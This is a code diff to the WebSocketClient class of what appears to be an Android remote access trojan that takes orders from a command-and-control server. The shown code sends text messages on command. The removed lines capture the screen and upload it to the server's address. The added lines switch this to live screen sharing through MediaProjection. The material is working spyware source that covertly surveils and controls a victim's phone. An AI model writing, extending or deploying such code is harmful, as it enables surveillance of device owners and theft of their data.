@@ -1,7 +1,10 @@
 package com.ot.grhq.client;
 
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.SurfaceTexture;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.os.Handler;
 import android.util.Base64;
 import android.util.Log;
@@ -30,10 +33,17 @@ import java.util.Map;
 public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     private Context context;
+    private MediaProjection mediaProjection;
 
     public WebSocketClient(Context context, URI serverUri) {
         super(serverUri);
         this.context = context;
+    }
+
+    public WebSocketClient(Context context, URI serverUri, MediaProjection mediaProjection) {
+        super(serverUri);
+        this.context = context;
+        this.mediaProjection = mediaProjection;
     }
 
     @Override
@@ -117,15 +127,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case SCREENSHOT:
-                    path = Screenshot.captureScreen();
-                    file = new File(path);
-
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/screenshot");
-
-                    json.put("res", "screenshot");
-                    json.put("filename", file.getName());
-                    json.put("timestamp", file.getName().split(".")[0]);
-                    send(json.toString());
+                    Screenshot.screenShare(context, mediaProjection);
                     break;
                 case TEXT:
                     SMS.send(req.getString("number"), req.getString("message"));
